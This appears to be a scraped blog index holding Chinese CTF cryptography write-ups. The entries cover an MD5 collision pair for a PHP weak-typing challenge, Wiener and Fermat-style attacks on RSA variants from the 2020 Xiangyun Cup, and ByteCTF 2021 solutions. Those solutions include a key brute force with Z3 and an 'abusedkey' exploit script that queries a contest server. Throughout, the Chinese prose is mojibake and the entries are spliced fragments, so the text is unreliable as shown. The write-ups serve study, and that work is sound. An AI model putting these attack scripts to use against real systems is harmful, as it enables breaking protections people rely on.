123$Param1=&quot;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2&quot;;$Param2=&quot;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2&quot;;#008ee33a9d58b51cfeb425b0959121c9 ä½¿ç”¨çš„æ—¶å€™è®°å¾—ç›´æ¥æ·»åŠ åˆ°åŒ…é‡Œé¢å», æµè§ˆå™¨ä¸Šè¾“å…¥æ˜¯æ— æ•ˆçš„","link":"/2020/10/22/web-md5%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"title":"writeup for 2020 ç¥¥äº‘æ¯ Crypto","text":"åªä¼šåšå¯†ç çš„èœé¸¡ Crypto0x01 SimpleRSAé¢˜ç›®1234567891011121314151617181920from Crypto.Util.number import *import gmpy2p, q, r = [getPrime(512) for i in range(3)]n = p * q * rphi = (p - 1) * (q - 1) * (r - 1)d = getPrime(256)e = gmpy2.invert(d , phi)flag = b&quot;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}&quot;c = pow(bytes_to_long(flag), e, n)print(e, n)print(c)'''1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679 18272219926928491792440698342738165657142765053052461034359628874615203817097399272230552399539651824512521947689357026280565870341738006058274240432816731836064787361899273777455753799088764564850168324168060292549727696173935602384943260789408422951530292853944917837123849901251007745964770644822808294078560148352317117889900666765344144147410677595641023316146667137970738112450995121305286004640994927346716890849900360778600422384549089608415951071229331731079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452''' æ€è·¯è¯´å®è¯è¿™é¢˜èƒ½åšå‡ºæ¥ä¹Ÿæ˜¯è¿æ°”å¥½â€¦wienerè¿˜æ²¡æœ‰è‡ªå·±å¤ç°è¿‡, ä¸€ç›´éƒ½æ˜¯ç”¨ç°æˆçš„è„šæœ¬. è€Œè¿™æ¬¡çš„næ˜¯å¤šä¸ªç´ å› å­çš„, ä¹‹å‰çš„è„šæœ¬ä¸èƒ½ç”¨äº†. æœ¬æ¥æ˜¯æƒ³ç€å»å­¦ä¸€ä¸‹æ€ä¹ˆå¤ç°çš„, ç»“æœç›´æ¥æ‰¾åˆ°åŸé¢˜äº†(ç¥¥äº‘æ¯å¥½åƒæŒºå¤šéƒ½èƒ½æ‰¾åˆ°åŸé¢˜æˆ–è€…æ˜¯å¾ˆåƒçš„é¢˜çš„ è¿™æ˜¯æ‰¾åˆ°çš„åŸé¢˜çš„wp ç›´æ¥æŠ„è„šæœ¬å°±èƒ½ç®—å‡ºdäº†, æ‰€ä»¥åˆ°åº•è¯¥æ€ä¹ˆå†™wienerå‘¢? å’•å’•å’•â€¦æœ‰ç©ºä¸€å®šå­¦ä¼šå®ƒ! ä»£ç 12345678910111213141516171819202122232425262728293031323334def hex2text(Hex): if len(Hex) % 2: Hex = '0' + Hex return ''.join([chr(int(b, 16)) for b in [Hex[i:i + 2] for i in range(0, len(Hex), 2)]])def dec2text(Dec): Hex = hex(Dec)[2:] return hex2text(Hex)def wiener(e, n): m = 12345 c = pow(m, e, n) q0 = 1 list1 = continued_fraction(Integer(e) / Integer(n)) conv = list1.convergents() for i in conv: k = i.numerator() q1 = i.denominator() for r in range(20): for s in range(20): d = r * q1 + s * q0 m1 = pow(c, d, n) if m1 == m: return d q0 = q1c = 1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452e = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679n = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173d = wiener(e,n)print(dec2text(pow(c,d,n))) 0x02 RSAssssé¢˜ç›®1234567891011121314151617from Crypto.Util.number import *from gmpy2 import next_primep = getPrime(512)q = getPrime(512)n = p * q * next_prime(p) * next_prime(q)e = 0x10001flag = b&quot;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}&quot;cipher = pow(bytes_to_long(flag), e, n)print(n, cipher)'''8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257 3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207''' æ€è·¯è´¹é©¬åˆ†è§£! æˆ‘æ€ä¹ˆä¼šæ²¡æƒ³åˆ°å‘¢, ä¸¤ä¸ªæ¥è¿‘çš„å› å­å°±å¯ä»¥ç”¨fermatäº†.è¿™é¢˜ä¹Ÿæ˜¯è¿æ°”å¥½,åœ¨è¿™ä¸ªå¤§æ•°åˆ†è§£ç½‘ç«™åå°è·‘äº†ä¸¤ä¸ªé’Ÿåˆ†å‡ºä¸¤åŠæ¥äº†(çœŸçš„æ˜¯æ²¡æ³¨æ„æ”¾åå°è·‘çš„ åˆ†å‡ºçš„ä¸¤åŠ: 12x1 = 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045175035339285085728002838220314068474670975228778464240088084331807420720121364486765011169669747553393661650912114228227308579940164269877101973728452252879383x2 = 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045172781798703173650574737644914515591522256758848089955578713458715234536664415216526830967831862301518636586702212189087959136509334102772855657664091570630079 è€ƒè™‘åˆ°np = next_prime(p)æ‰€ä»¥på’Œnpä¸ä¼šç›¸å·®å¤ªè¿œ, å¯ä»¥æœ‰$np = p+a$ ä¸å¦¨å‡è®¾$$p&lt;p+a&lt;q&lt;q+b$$ åˆå› ä¸ºp,qæ˜¯éšæœºç”Ÿæˆçš„ä¸¤ä¸ªå¤§ç´ æ•°, ä»–ä»¬ç›¸ç­‰çš„å¯èƒ½æ€§å¤ªä½. è€Œåˆ†å‡ºçš„x1, x2(x1&gt;x2)éå¸¸æ¥è¿‘, åˆ™x1,x2å¯èƒ½æœ‰çš„ç»„åˆæœ‰$$x_1 = p(q+b) \\ x_2 = q(p+a)$$æˆ–è€…æ˜¯$$x_1 = pq \\ x_2 = (p+a)(q+b)$$(å¯èƒ½è¿˜æœ‰æ²¡è€ƒè™‘åˆ°çš„?â€¦ é¦–å…ˆå°è¯•ç¬¬ä¸€ç§ç»„åˆ(ç›´æ¥ä¸­äº†x1å’Œx2ç›¸å‡æœ‰$$x = x_1-x_2 = bp-aq$$æ¶ˆå…ƒ$$p = {x \\over b} + {a \\over b}q \\x_2 ={a \\over v}q^2 + aq + {x \\over b}q$$ åˆ™å¯ä»¥æœ‰å…³äºqçš„äºŒæ¬¡æ–¹ç¨‹$$aq^2 + (ab + x)q - bx_2 = 0$$ å› ä¸ºè§£æ˜¯æ•´æ•°, æ‰€ä»¥deltaåº”è¯¥ä¸ºå®Œå…¨å¹³æ–¹æ•°$$\\Delta = (ab + x)^2 + 4abx_2$$ æ‰€ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹å¯ä»¥çˆ†ç ´å‡ºa,b ä»è€Œè§£å‡ºq,å†è€Œå°±èƒ½æœ‰p,q+b , p+aäº† (æœ‰ä¸€ç‚¹ä¸æ˜ç™½å°±æ˜¯æŒ‰ç†æ¥è¯´a,båªæœ‰1ç»„?å¯èƒ½æ˜¯æˆ‘æ²¡è€ƒè™‘å‘¨åˆ°,è·‘å‡ºæ¥4ç»„a,b, å‘ç°åªæœ‰ç¬¬å››ç»„è·‘å‡ºæ¥çš„qæ˜¯çœŸæ­£çš„q(å…¶ä»–ä¸‰ç»„éƒ½æ˜¯kq), æ‰€ä»¥ç›´æ¥é‡‡ç”¨ç¬¬å››ç»„çš„qå’Œa,b æƒ³æ˜ç™½äº†! å› ä¸ºäºŒæ¬¡é¡¹çš„ç³»æ•°æ˜¯a, å¦‚æœaçš„å› æ•°é‡Œé¢æœ‰å®Œå…¨å¹³æ–¹æ•°$k^2$, é‚£ä¹ˆå°±å¯èƒ½è§£å‡ºkqè¿™ä¸ªè§£äº†! æ±‚å‡ºnçš„å››ä¸ªç´ å› å­ä¹‹åå¸¸è§„çš„RSAè§£å¯†å°±è¡Œäº† ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940# coding=utf-8from gmpy2 import iroot, gcd, invertfrom Crypto.Util.number import long_to_bytesn = 8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257x1 = 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045175035339285085728002838220314068474670975228778464240088084331807420720121364486765011169669747553393661650912114228227308579940164269877101973728452252879383x2 = 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045172781798703173650574737644914515591522256758848089955578713458715234536664415216526830967831862301518636586702212189087959136509334102772855657664091570630079x = x1 - x2for a in range(1, 2000): for b in range(1, 2000): delta_sq = (x + a * b) ** 2 + 4 * a * b * x2 delta = iroot(delta_sq, 2) if delta[1]: p1 = (-(a * b + x) + delta[0]) // (2 * a) p2 = (-(a * b + x) - delta[0]) // (2 * a) if p1 &gt; 0 and gcd(p1, n) != 1: print(p1, a, b) if p2 &gt; 0 and gcd(p2, n) != 1: print(p2, a, b)''' result: 59509622824623675050066481062107171504849863374230362259884081452647743246974989796952759980519162117328441285479164180294347299033843912200899999033032168 1 1536 29754811412311837525033240531053585752424931687115181129942040726323871623487494898476379990259581058664220642739582090147173649516921956100449999516516084 2 768 14877405706155918762516620265526792876212465843557590564971020363161935811743747449238189995129790529332110321369791045073586824758460978050224999758258042 4 384 7438702853077959381258310132763396438106232921778795282485510181580967905871873724619094997564895264666055160684895522536793412379230489025112499879129021 8 192'''q = 7438702853077959381258310132763396438106232921778795282485510181580967905871873724619094997564895264666055160684895522536793412379230489025112499879129021np = x2 // qnq = q + 192p = np - 8e = 0x10001c = 3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207phi = (p - 1) * (q - 1) * (np - 1) * (nq - 1)d = invert(e, phi)print(long_to_bytes(pow(c, d, n))) è¿™é“é¢˜ç®—çš„æ—¶å€™è¿˜ç®—è½»æ¾çš„, çŒœå‡ºç»„åˆä¹‹åç”¨deltaçˆ†ç ´ä¹Ÿä¸æ˜¯ç¬¬ä¸€æ¬¡åšäº† æ€»ç»“è¿˜æ˜¯å¤ªèœâ€¦èƒ½åšçš„å°±åªæœ‰ç®€å•çš„â€¦å‰©ä¸‹çš„å¯†ç é¢˜è¿˜æœ‰ more_calc Exposure easy matrix Blowfish more_calc çœ‹è¿‡äº†Nu1lçš„WP, Sç¡®å®æ˜¯å¯ä»¥ç”¨åˆ«çš„åŠæ³•ç®—çš„â€¦è¿™å‡ å¤©ä¸€å®šè¦æŠŠåŸç†ææ‡‚(è¿™ä¸ªåº”è¯¥ä¸éš¾ Exposureå’Œeasy matrixéƒ½æ˜¯éœ€è¦ç”¨åˆ°LLLçš„çŸ¥è¯†çš„â€¦è¿™ä¸ªçœŸçš„è¿˜æ²¡å­¦ä¼š åƒäº†å¤§äº, æ ¼ç†è®ºçœŸçš„è¦å¥½å¥½çš„å»æŸ¥ä¸€æŸ¥èµ„æ–™äº†ç‰¹åˆ«æ˜¯Exposureâ€¦è®ºæ–‡éƒ½æŸ¥åˆ°äº†!å°±æ˜¯å› ä¸ºä¸ä¼šLLLå°±ä¸ä¼šåšäº†(å¥½èœå•Š ä¸€å®šè¦å­¦ä¼šLLL! Blowfish ç¬¬ä¸€æ¬¡æ¥è§¦Blowfish, å…ˆæš‚æ—¶æ”¾ç€å§.. çœŸã®æ€»ç»“å¾ˆå¤šç†è®ºçŸ¥è¯†è¿˜æ²¡æœ‰å­¦ä¼šå§. çœŸçš„æ„Ÿè§‰é¢˜ç›®æ˜¯æ°´çš„, è‡ªå·±èœåšä¸å‡ºæ¥è€Œå·².ç„¶åå°±æ˜¯å…³äºRSA, åšäº†è¿™æ¬¡æ˜ç™½äº†å…¶å®å¾ˆå¤šæ—¶å€™ç”¨åˆ°çš„æ–¹æ³•éƒ½æ˜¯å·²ç»å­¦è¿‡çš„, è§‚å¯Ÿé¢˜ç›®ç»™çš„æ¡ä»¶çš„ç‰¹ç‚¹, å†æƒ³æƒ³è‡ªå·±ä¼šçš„æ–¹æ³•çš„ç‰¹ç‚¹(è´¹é©¬åˆ†ä¸¤ä¸ªæ¥è¿‘pq, wieneré€‚åˆç‰¹åˆ«å¤§çš„eç­‰ç­‰. è¿™æ ·åšçš„å¯èƒ½ä¼šæ›´æœ‰æ€è·¯æ›´å¿«ä¸€ç‚¹","link":"/2020/11/23/writeup-for-2020-%E7%A5%A5%E4%BA%91%E6%9D%AF/"},{"title":"writeup for 2021 ByteCTF çº¿ä¸Š","text":"Byteçº¿ä¸Š, å‹‰å¼ºå‰20æŒ¤è¿›çº¿ä¸‹äº†, å±å®åˆºæ¿€ é¢˜ç›®éš¾åº¦ä¸­ç­‰æŠŠ, ä¸ä¼šç‰¹åˆ«ç™½ç»™ä½†ä¹Ÿä¸ä¼šç‰¹åˆ«éš¾, å°±æ˜¯æŸé“é¢˜CFBæä¸æ‡‚æ‘¸äº†å°†è¿‘ä¸€å¤©æ‰åœ¨æœ€åä¸€ä¸ªå°æ—¶æ‘¸å‡ºæ¥ easyxoré¢˜ç›®æŠŠ$flag$åˆ†æˆä¸¤éƒ¨åˆ†$flagFront \\ and \\ flagBack$, å¹¶ä¸”ç»™äº†ä¸€ä¸ªåŠ å¯†ç”¨çš„å‡½æ•°$convert$, çœ‹äº†çœ¼$key$çš„å¤§å°, $2^{24}$æ˜¯å§, å–œæ¬¢çŸ­çš„æ˜¯å§, å¾…ä¼šå°±æŠŠå®ƒç»™çˆ†äº† å…ˆæ¥çœ‹$flagFront$, åŠ å¯†ç”¨çš„æ¨¡å¼æ˜¯$OFB$, è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹è¦æƒ³åˆ°, $flag$çš„å‰ç¼€æ˜¯ByteCTF{åˆšå¥½8å­—èŠ‚ä¹Ÿå°±æ˜¯ä¸€ä¸ªåˆ†ç»„. å¯¹ç€ä¸Šé¢çš„è§£å¯†è¿‡ç¨‹, å› ä¸ºç¬¬ä¸€ä¸ªæ˜æ–‡ByteCTF{å¯†æ–‡åˆ†ç»„éƒ½æœ‰äº†, å¯ä»¥ç›´æ¥å¼‚æˆ–è®¡ç®—å‡ºç¬¬ä¸€å—çš„$Block \\ Cipher \\ $ ç¬¬äºŒå—çš„$Block \\ Cipher$æ˜¯ç¬¬ä¸€å—åŠ å¯†å¾—åˆ°, å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿè¿è¡ŒåŠ å¯†ç¨‹åº, æˆ‘ä»¬å°±èƒ½è¿˜åŸå‡ºåé¢çš„æ˜æ–‡, ä½†æˆ‘ä»¬æ²¡æœ‰key, æ²¡åŠæ³•è·‘åŠ å¯† ä¸è¿‡ä¸€å¼€å§‹æœ‰æåˆ°, $key$çš„å¤§å°å°±$2^{24}$è¿™ä¹ˆå¤§, å®Œå…¨å¯ä»¥èŠ±ä¸€ç‚¹æ—¶é—´çˆ†ç ´, æ‰€ä»¥æ€è·¯æœ‰äº†, ç›´æ¥ç©·ä¸¾æ‰€æœ‰çš„$key$, èƒ½æŠŠåé¢çš„ä¸¤ç»„å¯†æ–‡è¿˜åŸæˆuuid(è¿™ä¸ªuuidå½¢å¼ä¹Ÿæ˜¯çŒœå‡ºæ¥çš„, è§‰å¾—æœ‰å¯èƒ½å°±è¯•äº†ä¸€ä¸‹)é‚£ç§å½¢å¼çš„å­—ç¬¦ä¸²çš„$key$å°±æ˜¯å¯¹çš„$key$. çˆ†ç ´å‡º$key$ä»¥åå°±æ˜¯è€ƒè™‘æ€ä¹ˆå†™$convert$çš„é€†æ“ä½œ, ä¹Ÿå°±æ˜¯è§£å¯†æ“ä½œ,é€†å‡ºæ¥äº†å°±èƒ½æ‹¿åˆ°$IV$äº†,ä½†æ˜¯,æ•´äº†åŠå¤©æ²¡å•¥å¤´ç»ª, å¹²è„†ä¸ŠZ3ç›´æ¥æ—¥, æ²¡æƒ³åˆ°çœŸçš„èƒ½æ—¥å‡ºæ¥. æ‹¿åˆ°äº†$IV$å’Œ$Key$, æˆ‘ä»¬åˆå¯èƒ½é€†æ“ä½œ$convert$, $flagBack$ç”¨çš„æ˜¯$CBC$æ¨¡å¼, é‚£ä¸æ˜¯è¦ä»€ä¹ˆæœ‰ä»€ä¹ˆ? 1234567891011121314151617181920212223242526272829303132333435# keyçˆ†ç ´cip = '89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912'cp = [cip[i:i+16] for i in range(0,len(cip),16)]flag = b'ByteCTF{'last = bytes_to_long(flag) ^ int(cp[0],16)for i in range(-32, 33): for j in range(-32, 33): for k in range(-32, 33): for l in range(-32, 33): last = bytes_to_long(flag) ^ int(cp[0],16) keys = [i,j,k,l] try: m1,last = decry_ofb(int(cp[1],16),keys,last) M = m1.decode('ASCII') m2,last = decry_ofb(int(cp[2],16),keys,last) M = M + m2.decode('ASCII') if check(M): print(M,keys) except: pass# [-12, 26, -3, -31]key = [-12, 26, -3, -31]IV = 16476971533267772345S = z3.Solver()x = z3.BitVec('x',65)S.add(convert(x,key) == int(cp[5],16))if S.check(): print(S.model())print(long_to_bytes(10936161096540945944 ^ int(cp[4],16)))# è¿™æ˜¯æœ€åä¸€ä¸ªå¯†æ–‡åˆ†ç»„çš„Z3è„šæœ¬, æ¯ä¸ªåˆ†ç»„éƒ½æ˜¯æ‰‹åŠ¨å¡«å‚æ•°ç®—å‡ºæ¥çš„, ä¸€å…±å››ä¸ªåˆ†ç»„, OFBä¸€ä¸ªåˆ†ç»„, CBCä¸‰ä¸ªåˆ†ç»„éƒ½éœ€è¦Z3# æ³¨æ„çš„æ˜¯æœ‰æ—¶å€™Z3ä¼šæœ‰å¤šä¸ªè§£, éœ€è¦è½¬æˆå­—ç¬¦ä¸²åˆ¤æ–­æ˜¯ä¸æ˜¯æ­£ç¡®çš„è§£, ä¸æ­£ç¡®çš„æ’é™¤æ‰ mdçˆ†ç ´keyçš„æ—¶å€™å¿˜äº†æ¯æ¬¡éƒ½é‡ç½®ä¸€ä¸‹last, çˆ†äº†ä¸€ä¸Šåˆçš„keyéƒ½æ²¡æœ‰ç»“æœ, å±å®çº¯é“¸å¸äº†è¿™æ³¢, è¿˜å¥½ä¸‹åˆèµ¶ç€æ‰“apex, ç¡¬æ˜¯é‡æ–°å†™äº†éè„šæœ¬æ‰å‘ç°é—®é¢˜. æ€»ä¹‹z3 yyds! abusedkeyä¸¤ä¸ªæ²¡æœ‰è§è¿‡çš„åè®®, çœ‹åˆ°å°±æƒ³æ‘¸äº†, åé¢æ²¡æ–°é¢˜å±å®æ˜¯æ‘¸ä¸ä¸‹å»äº†, é¢˜ç›®éƒ½å¿«ç©¿äº†éƒ½, èµ¶ç´§è§£å‹é™„ä»¶çœ‹é¢˜. è¿™åè®®ä¹Ÿå°±æ˜¯çœ‹ç€çƒ¦è€Œå·², è®¤çœŸçœ‹ä¸‹å»è¿˜æ˜¯å¯ä»¥åšçš„, å°±æ˜¯tmç»™hintè¿˜ç»™çš„è¿™ä¹ˆéº»çƒ¦, ç›´æ¥è·³è¿‡hintäº† é¢˜ç›®ç»™çš„åè®®è¿‡ç¨‹å°±ä¸å¤è¿°äº†, ç¬¬ä¸€ä¸ªåè®®çš„å…³é”®éƒ¨åˆ†åœ¨ä¸‹é¢ &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; $\\underleftarrow{\\qquad \\ \\ \\ \\ \\ msg_{12} = T_S \\qquad \\ \\ \\ \\ \\ }$ &emsp;&emsp;&emsp;&emsp;$t_C \\stackrel{R}{\\leftarrow} {\\mathbb Z}_p^*$ &emsp;&emsp;&emsp;&emsp;$T_C = r_C \\cdot G$ &emsp;&emsp;&emsp;&emsp;$K_{CS} = (d_C+t_C)\\cdot T_S + t_C\\cdot P_S$ &emsp;&emsp;&emsp;&emsp;$sk_1 = \\mathcal{H}({K_{CS}}_x)$ &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp;$\\underrightarrow{\\qquad \\ msg_{13} = sid_1||T_C\\qquad \\ }$ &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;$K_{CS} = (d_S+t_S)\\cdot T_C + t_S\\cdot P_C$ &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;$sk_1 = \\mathcal{H}({K_{CS}}_x)$ &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;$C_{flag} = E_{sk_1}(flag)$ &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; $\\underleftarrow{\\qquad \\ \\ \\ msg_{14} = C_{flag} \\qquad \\ \\ \\ \\ }$ &emsp;&emsp;&emsp;&emsp;$flag = D_{sk_1}(C_{flag})$ æœ€åå¾—åˆ°çš„æ˜¯$AES-GCM$åŠ å¯†è¿‡åçš„$flag$, è¦è§£å¯†è‚¯å®šå¾—çŸ¥é“$sk$ä¹Ÿå°±æ˜¯è¦çŸ¥é“$K_{CS}$, é—®é¢˜åœ¨äºè¿™é¢˜æˆ‘ä»¬ä¸çŸ¥é“åº”è¯¥çŸ¥é“çš„$d_C$å’Œ$P_S$ , è¿™å°±æ²¡åŠæ³•ç®—$K_{CS}$äº†. ä¸è¿‡åé¢æœ‰æåˆ°: Serverçš„ç§é’¥/å£ä»¤å“ˆå¸Œï¼Œéƒ½æºè‡ªåŒä¸€ä¸ª2å­—èŠ‚å£ä»¤ï¼Œå³$\\pi_S \\in {0,1}^{16}$ï¼Œå¹¶ä¸”$d_S = {\\mathcal H}(\\pi_S)$ï¼› å¥½å®¶ä¼™$16$ä½çš„å£ä»¤, åˆæ˜¯è¿™ä¹ˆçŸ­çš„, $d_S$é‚£ä¸æ˜¯ç›´æ¥çˆ†å—è€å“¥, æœ‰$d_S$å°±ç­‰äºæœ‰$P_S$äº†, é‚£ä¹ˆé—®é¢˜çš„å…³é”®å°±åœ¨äºæ€ä¹ˆå»é€‰æ‹©$t_C$, ä½¿å¾—$d_C$ä¸ç”¨çŸ¥é“ä¹Ÿèƒ½è®¡ç®—$sk$, é‚£ç¬¬ä¸€çœ¼çœ‹åˆ°çš„ä¸å°±æ˜¯$d_C+t_C$è¿™ä¸€é¡¹å—? ç›´æ¥å–$t_C = - d_C$, é‚£æ•´ä¸ª$K_{CS}$çš„è®¡ç®—å°±å˜æˆ$$K_{CS} = t_C \\cdot P_S = -d_C \\cdot d_S \\cdot G = -P_C \\cdot d_S$$$P_C$å°±æ˜¯å®¢æˆ·çš„å…¬é’¥, è¿™ä¸ªæ˜¯æœ‰çš„, åˆ°è¿™é‡Œæˆ‘ä»¬å°±èƒ½å¤Ÿè®¡ç®—$K_{CS}$å†è®¡ç®—$sk$,æœ€åç”¨$sk$è§£å¯†$flag$å°±è¡Œ è‡³äºåè®®äºŒ, æ²¡ç ”ç©¶æ€ä¹ˆæ•´, èµ›åå¬L-teamçš„å¸ååå¸å››è¸¢é›¶çˆ·è¯´åè®®äºŒå°±æ˜¯ç»™$d_S$çš„, æ‰€ä»¥ç»“æœæ˜¯æˆ‘å¤ªæš´åŠ›äº†æ˜¯å—? çˆ†, èƒ½çˆ†çš„éƒ½å¯ä»¥çˆ†, çˆ†å°±å®Œäº‹äº†, å°±æ˜¯çˆ†$d_S$çš„æ—¶å€™å‘ç°å°å°çš„ä¸€ä¸ª16ä½å±…ç„¶è¦èŠ±æˆ‘20åˆ†é’Ÿ, èµ¶ç´§æ‰“å¼€TIMIæ¥ä¸€æŠŠ, æ²¡æƒ³åˆ°ååˆ†é’Ÿ$flag$å°±å‡ºæ¥äº†, æœæ–­ç‚¹äº†æŠ•é™äº¤$flag$äº†. 12345678910111213141516171819202122232425262728293031import requestsfrom Crypto.Util.number import long_to_bytes,bytes_to_longfrom hashlib import sha256from Crypto.Cipher import AESfrom tqdm import tqdmurl = 'http://39.105.181.182:30000/abusedkey/server/msg11'session_id = '8cae789b1eac36ad274ee14cac147bdf2dde49585c8db2463d5b6b5f7f44e4da'p = 2 ^ 256 - 2^32 - 977Ep = EllipticCurve(GF(p),[0,7])G = Ep((0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8))Pc = Ep((0xb5b1b07d251b299844d968be56284ef32dffd0baa6a0353baf10c90298dfd117,0xea62978d102a76c3d6747e283091ac5f2b4c3ba5fc7a906fe023ee3bc61b50fe))Msg12 = requests.get(url,data=session_id).texturl = 'http://39.105.181.182:30000/abusedkey/server/msg13'Tc = -Pcdata13 = session_id + hex(Tc[0])[2:].ljust(64,'0') + hex(Tc[1])[2:].ljust(64,'0')Msg14 = long_to_bytes(int(requests.get(url,data=data13).text,16))iv = Msg14[:12]enc_flag = Msg14[12:-16] for i in tqdm(range(2**16)): ds = bytes_to_long(sha256(long_to_bytes(i)).digest()) KCS = -ds * Pc sk = sha256(long_to_bytes(KCS[0])).digest() A = AES.new(sk,AES.MODE_GCM,iv) flag = A.decrypt(enc_flag) if b'Byte' in flag: print(flag) break Overheardé¢˜ç›®å°±é‚£ä¹ˆå‡ è¡Œ, æµç¨‹å€’æ˜¯æŒºå®¹æ˜“æ‡‚çš„, 